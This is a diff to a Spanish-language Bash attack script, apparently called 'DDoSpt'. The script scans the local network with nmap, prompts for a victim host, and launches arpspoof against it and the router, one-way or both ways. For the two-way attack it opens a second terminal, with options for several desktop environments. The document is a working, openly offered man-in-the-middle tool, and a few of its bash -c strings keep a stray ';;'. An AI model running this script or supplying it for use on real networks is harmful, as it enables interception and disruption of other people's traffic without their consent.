@@ -8,9 +8,29 @@ ctrl_c() {
     echo "Saliendo..."
     exit 1
 }
-
 ip="$(hostname -I | awk '{print $1}')"
-echo "dependencias necesarias: (nmap y dsniff) si no lo tienes instalado, instálalo con: sudo apt install nmap dsniff"
+
+ascii() {
+    echo -e "\e[31m###################################################################################################################################################################################################################\e[0m"        
+    echo -e "\e[32m                                                                                   ██████╗ ██████╗          ███████╗                 \e[0m"
+    echo -e "\e[32m                                                                                   ██╔══██╗██╔══██╗██████╗  ██╔════╝██████╗ ████████╗\e[0m"
+    echo -e "\e[32m                                                                                   ██║  ██║██║  ██║██╔═══██╗███████╗██╔══██╗╚══██╔══╝\e[0m"
+    echo -e "\e[32m                                                                                   ██║  ██║██║  ██║██║   ██║╚════██║██████╔╝   ██║   \e[0m"
+    echo -e "\e[32m                                                                                   ██████╔╝██████╔╝╚██████╔╝███████║██╔═══╝    ██║   \e[0m"
+    echo -e "\e[32m                                                                                   ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝        ╚═╝   \e[0m"
+    echo -e "\e[31m###################################################################################################################################################################################################################\e[0m"
+}
+clear
+echo -e "\e[31m###################################################################################################################################################################################################################\e[0m"        
+echo -e "\e[32m                                                                                   ██████╗ ██████╗          ███████╗                 \e[0m"
+echo -e "\e[32m                                                                                   ██╔══██╗██╔══██╗██████╗  ██╔════╝██████╗ ████████╗\e[0m"
+echo -e "\e[32m                                                                                   ██║  ██║██║  ██║██╔═══██╗███████╗██╔══██╗╚══██╔══╝\e[0m"
+echo -e "\e[32m                                                                                   ██║  ██║██║  ██║██║   ██║╚════██║██████╔╝   ██║   \e[0m"
+echo -e "\e[32m                                                                                   ██████╔╝██████╔╝╚██████╔╝███████║██╔═══╝    ██║   \e[0m"
+echo -e "\e[32m                                                                                   ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝        ╚═╝   \e[0m"
+echo -e "\e[36m                                                                                      dependencias necesarias: (nmap y dsniff)\e[0m"
+echo -e "\e[31m###################################################################################################################################################################################################################\e[0m"
+echo "se empezara escaneando los dispositivos en la red"
 echo "Se escaneará por defecto en /24."
 while true; do
     read -p "¿Desea ese rango? (s/n): " respuesta_rango
@@ -33,35 +53,56 @@ while true; do
         echo "Respuesta no válida."
     fi
 done
-echo -e "\e[31mcuando termine de escanear presione ENTER...\e[0m"
-echo "Escaneando en el rango: $rango"
+clear
+ascii
+echo -e "\e[36mcuando termine de escanear presione ENTER...\e[0m"
+echo "Escaneando en el rango: $rango..."
 sudo nmap -sn "$rango"
 read -p ""
-read -p "que dispositivo desea atacar (ingrese el host ID de la ip): " host_id
-ip_objetivo="${ip%.*}.$host_id"
-echo "el objetivo sera: $ip_objetivo"
+while true; do
+	read -p "que dispositivo desea atacar (ingrese el host ID de la ip):" host_id
+	if [[ "$host_id" -lt 2 || "$host_id" -gt 254 ]]; then
+        echo "Ingrese un numero entre 2 y 254"
+        sleep 2
+        continue
+	else
+		ip_objetivo="${ip%.*}.$host_id"
+		echo "el objetivo sera: $ip_objetivo"
+		break
+	fi
+done
 interfaz_red_defecto=$(ip -o addr show | grep "$ip" | awk '{print $2}')
-echo "ingrese la interfaz de red a usar:"
-echo "1-por defecto en tu sistema:$interfaz_red_defecto"
-echo "2-manual"
-read -p "(1-2):" pregunta_interfaz
+while true; do
+    clear 
+    ascii
+    echo "ingrese la interfaz de red a usar:"
+    echo "1-por defecto en tu sistema:$interfaz_red_defecto"
+    echo "2-manual"
+    read -p "(1-2):" pregunta_interfaz
     if [[ $pregunta_interfaz == "1" ]]; then
         interfaz_red="$interfaz_red_defecto"
+        break
     elif [[ $pregunta_interfaz == "2" ]]; then
         read -p "ingrese la interfaz de red a usar (ejemplo: eth0, wlan0): " interfaz_red
+        break
     else
-        echo "Opción no válida. Usando la interfaz por defecto: $interfaz_red_defecto"
-        interfaz_red="$interfaz_red_defecto"
+        echo "Opción no válida, intente de nuevo"
     fi
+done
+clear
+ascii    
 router="${ip%.*}.1"
 echo "como desea el ataque:"
 echo "1- unidireccional (ataque en la comunicacion entre la victima y el router)"
 echo "2- bidireccional (ataque en la comunicacion entre la victima y el router y biceversa al mismo tiempo, se habriran dos terminales para pararlo presione CTRL+C en ambas)"
 read -p ":" direcciones
 if [[ $direcciones == "1" ]]; then
+    clear
     echo "Iniciando ataque unidireccional..."
     sudo arpspoof -i $interfaz_red -t $ip_objetivo $router
 elif [[ $direcciones == "2" ]]; then
+    clear
+    ascii
     echo "¿cual es su interfaz grafica?"
     echo "1- GNOME"
     echo "2- XFCE"
@@ -76,48 +117,63 @@ elif [[ $direcciones == "2" ]]; then
     inverso="sudo arpspoof -i $interfaz_red -t $router $ip_objetivo"
     directo="sudo arpspoof -i $interfaz_red -t $ip_objetivo $router"
     if [[ $interfaz_grafica == "1" ]]; then
+        clear
         echo "Iniciando ataque bidireccional..."
-        gnome-terminal -- bash -c "$inverso; exec bash"" &
+        gnome-terminal -- bash -c "$inverso; exec bash" &
         $directo
     elif [[ $interfaz_grafica == "2" ]]; then
+        clear
         echo "Iniciando ataque bidireccional..."
-        xfce4-terminal --command "bash -c '$inverso; exec bash'"" &
+        xfce4-terminal --command "bash -c '$inverso; exec bash'" &
         $directo
     elif [[ $interfaz_grafica == "3" ]]; then
+        clear
         echo "Iniciando ataque bidireccional..."
         konsole -e bash -c "$inverso; exec bash" &
         $directo
     elif [[ $interfaz_grafica == "4" ]]; then
+        clear
         echo "Iniciando ataque bidireccional..."
         mate-terminal -- bash -c "$inverso; exec bash" &
         $directo
     elif [[ $interfaz_grafica == "5" ]]; then
+        clear
         echo "Iniciando ataque bidireccional..."
         lxterminal -e "bash -c '$inverso;; exec bash'" &
         $directo
     elif [[ $interfaz_grafica == "6" ]]; then
+        clear
         echo "Iniciando ataque bidireccional..."
         qterminal -e "bash -c '$inverso;; exec bash'" &
         $directo
     elif [[ $interfaz_grafica == "7" ]]; then
+        clear
         echo "Iniciando ataque bidireccional..."
         terminator -x bash -c "$inverso;; exec bash" &
         $directo
     elif [[ $interfaz_grafica == "8" ]]; then
+        clear
         echo "Iniciando ataque bidireccional..."
         deepin-terminal -e "bash -c '$inverso;; exec bash'" &
         $directo
     elif [[ $interfaz_grafica == "9" ]]; then
+        clear
+        ascii
         echo "Por favor, si tiene interfaz grafica abra una nueva terminal y ejecute el siguiente comando:"
         echo "$inverso"
         echo "Presione ENTER para continuar con el ataque directo..."
         read -p ""
+        clear
         $directo
     else
+        clear
+        ascii
         echo "Opción no válida. Saliendo."
         exit 1
     fi
 else
+    clear
+    ascii
     echo "Opción no válida. Saliendo."
     exit 1
 fi
